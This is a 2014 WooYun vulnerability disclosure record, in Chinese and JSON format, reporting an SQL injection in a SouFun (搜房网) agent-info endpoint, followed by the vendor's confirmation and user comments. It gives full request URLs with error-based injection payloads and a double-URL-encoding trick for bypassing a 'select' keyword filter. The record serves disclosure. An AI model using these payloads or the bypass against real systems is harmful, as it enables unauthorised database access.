{"id": 1900, "wybug_id": "wooyun-2014-067784", "wybug_title": "搜房网某处SQL注射漏洞", "wybug_corp": "搜房网", "wybug_author": "Undoit", "wybug_date": "2014-07-07 23:19", "wybug_open_date": "2014-08-21 23:20", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-07-07：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-07-11：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-07-21：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-07-31：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-08-10：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-08-21：\t细节向公众公开  简要描述： 搜房网某处SQL注射,显错注入 详细说明：  0.http://ims.agent.soufun.com/soufuntalk/OnlineTalk/Client.ashx?callback=jsonp1404532114077&RequestType=GetAgentInfo&City=%25E9%2598%25B2%25E5%259F%258E%25E6%25B8%25AF&AgentIds=163437693注入参数1:City (可绕过对关键字select的过滤)注入参数2:AgentIds参数City 带入SQL时做了2次URL解码，注入的语句先做2次URL编码，即可以在拼接到最终SQL时注入；这里对参数中的关键字select做了替换为全角字符的防注入，但是先做替换再进行URL解码，使用s%2565lect即可以成功注入select.正常情况：\n\nhttp://ims.agent.soufun.com/soufuntalk/OnlineTalk/Client.ashx?callback=jsonp1404532114077&RequestType=GetAgentInfo&City=%25E9%2598%25B2%25E5%259F%258E%25E6%25B8%25AF%2527&AgentIds=163437693加单引号（%2527）\n\n   漏洞证明：  1.暴用户' and user>0--   %2527%2520and%2520user%253E0--http://ims.agent.soufun.com/soufuntalk/OnlineTalk/Client.ashx?callback=jsonp1404532114077&RequestType=GetAgentInfo&City=%25E9%2598%25B2%25E5%259F%258E%25E6%25B8%25AF%2520%2527%2520and%2520user%253E0--&AgentIds=163437693\n\n暴数据库' and db_name()>0--   %2527%2520and%2520db_name%2528%2529%253E0--http://ims.agent.soufun.com/soufuntalk/OnlineTalk/Client.ashx?callback=jsonp1404532114077&RequestType=GetAgentInfo&City=%25E9%2598%25B2%25E5%259F%258E%25E6%25B8%25AF%2527%2520and%2520db_name%2528%2529%253E0--&AgentIds=163437693\n\n   修复方案：  你懂的   版权声明：转载请注明来源 Undoit@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：6  确认时间：2014-07-11 09:30 厂商回复： 感谢您对搜房网系统安全的关注，您提到的问题已经修复。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-07-07 23:21 |    \t\tUndoit \t\t\t( 普通白帽子  |\t\t\t        Rank:167 漏洞数:25        | 打酱油)\t\t \n  @疯狗 @xsser 提交时，用户cookie失效了，果然变路人甲了    \n     2014-07-08 01:02 |    \t\t魇 \t\t\t( 普通白帽子  |\t\t\t        Rank:1207 漏洞数:104        | 传闻中魇是一个惊世奇男子，但是除了他华...)\t\t \n  @Undoit 尴尬 我也这样过    \n     2014-07-08 10:51 |    \t\tNero \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:4        | 我是一只小菜鸟，小呀小菜鸟~)\t\t \n  @魇 @Undoit 那样是不是自己就没有rank了.....路人甲最终成为核心白帽子.....    \n     2014-07-08 11:03 |    \t\tUndoit \t\t\t( 普通白帽子  |\t\t\t        Rank:167 漏洞数:25        | 打酱油)\t\t \n  @Nero 自己点匿名的有rank，cookie失效的，显然没有    \n     2014-07-08 11:04 |    \t\tUndoit \t\t\t( 普通白帽子  |\t\t\t        Rank:167 漏洞数:25        | 打酱油)\t\t \n  @魇 呵呵    \n     2014-07-08 11:09 |    \t\t魇 \t\t\t( 普通白帽子  |\t\t\t        Rank:1207 漏洞数:104        | 传闻中魇是一个惊世奇男子，但是除了他华...)\t\t \n  @Undoit @Nero 可以提供细节联系审核人员调整    \n     2014-07-08 12:12 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  @Undoit 这个可以 @肉肉 帮你核实处理下     \n     2014-07-09 11:22 |    \t\t肉肉  \t\t\t( 普通白帽子  |\t\t\t        Rank:112 漏洞数:10        | 肉肉在长亭科技，肉肉在长亭科技，肉肉在长...)\t\t \n  @Undoit 这个漏洞是你提交的哇？加qq2928983512    \n     2014-08-20 14:24 |    \t\t铁蛋火车侠 \t\t\t( 普通白帽子  |\t\t\t        Rank:156 漏洞数:31        | Q群371620085 技术交流群 有漂亮妹纸！)\t\t \n  有道理    \n     2014-08-22 14:26 |    \t\tlatershow \t\t\t( 路人 |\t\t\t        Rank:24 漏洞数:6        | andr0day)\t\t \n  搜房被人内射了n次啊    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 6, "Ranks": null}